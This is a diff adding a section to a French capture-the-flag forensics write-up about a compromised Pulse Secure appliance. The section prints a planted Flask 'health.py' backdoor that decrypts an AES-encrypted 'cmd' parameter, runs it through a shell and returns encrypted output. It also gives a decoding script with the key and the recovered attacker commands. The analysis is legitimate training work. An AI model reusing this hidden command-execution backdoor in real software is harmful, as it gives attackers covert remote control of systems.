@@ -76,6 +76,70 @@ Il suffit donc de composer les deux possibilités de flag à partir de ces infos
 > Vous avez réussi à déchiffrer l'archive. Il semblerait qu'il y ait dans cette archive une autre archive, qui contient le résultat du script de vérification d'intégrité de l'équipement.
 
 > À l'aide de cette dernière archive et des journaux, vous cherchez maintenant les traces d'une persistance déposée et utilisée par l'attaquant.
+
+Grâce à la première archive décompressée, nous obtenons l'accès à `temp-scanner-archive-20240315-065846.tgz`. Une fois elle-même décompressée, cette archive nous révèle un simple script de config, ainsi qu'un environnement virtuel python. En creusant dans cet environnement, on trouve le fichier `tmp/home/venv3/lib/python3.6/site-packages/cav-0.1-py3.6.egg`. Ce type de fichier est à nouveau décompressable ce qui nous donne accès au code gérant le serveur CAV, dont nous possédons les logs depuis la première étape.
+
+En investigant chacun des scripts, on se rend compte que le fichier `health.py` de l'api est totalement anormal :
+```python
+#
+# Copyright (c) 2018 by Pulse Secure, LLC. All rights reserved
+#
+import base64
+import subprocess
+import zlib
+import simplejson as json
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+from flask import request
+from flask_restful import Resource
+
+
+class Health(Resource):
+    """
+    Handles requests that are coming for client to post the application data.
+    """
+
+    def get(self):
+        try:
+            with open("/data/flag.txt", "r") as handle:
+                dskey = handle.read().replace("\n", "")
+            data = request.args.get("cmd")                                        # ATTEND UN PARAMETRE CMD DANS LA REQUETE
+            if data:
+                aes = AES.new(dskey.encode(), AES.MODE_ECB)
+                cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))        # DECODE LE BASE64 PUIS DECHIFFRE AVEC LA CLE AES
+                result = subprocess.getoutput(cmd)                                # EXECUTE LA COMMANDE DECHIFREE
+                if not isinstance(result, bytes): result = str(result).encode()
+                result = base64.b64encode(aes.encrypt(pad(zlib.compress(result), 32))).decode()
+                return result, 200                                                # RETOURNE LE RESULTAT DE LA COMMANDE
+        except Exception as e:
+            return str(e), 501
+```
+
+Pour retrouver les commandes executées par l'attaquant, il faut donc patcher ce script pour afficher les commandes et retrouver dans le fichier de log `cav_webserv.log` chaque occurence du paramètre `?cmd=`.
+
+```python
+import base64
+import zlib
+from Cryptodome.Cipher import AES
+from Cryptodome.Util.Padding import pad, unpad
+
+dskey = "50c53be3eece1dd551bebffe0dd5535c"
+data = "/ppF2z0iUCf0EHGFPBpFW6pWT4v/neJ6wP6dERUuBM/6CAV2hl/l4o7KqS7TvTZAWDVxqTd6EansrCTOAnAwdQ=="
+
+if data:
+    aes = AES.new(dskey.encode(), AES.MODE_ECB)
+    cmd = zlib.decompress(aes.decrypt(base64.b64decode(data)))
+    print(cmd)
+```
+
+En décodant successivement, on obtient :
+```bash
+id
+ls /
+echo FCSC{REDACTED}
+[...]
+```
+
 ## Partie 4/5
 > Vous remarquez qu'une fonctionnalité built-in de votre équipement ne fonctionne plus et vous vous demandez si l'attaquant n'a pas utilisé la première persistance pour en installer une seconde, moins "visible"...
 
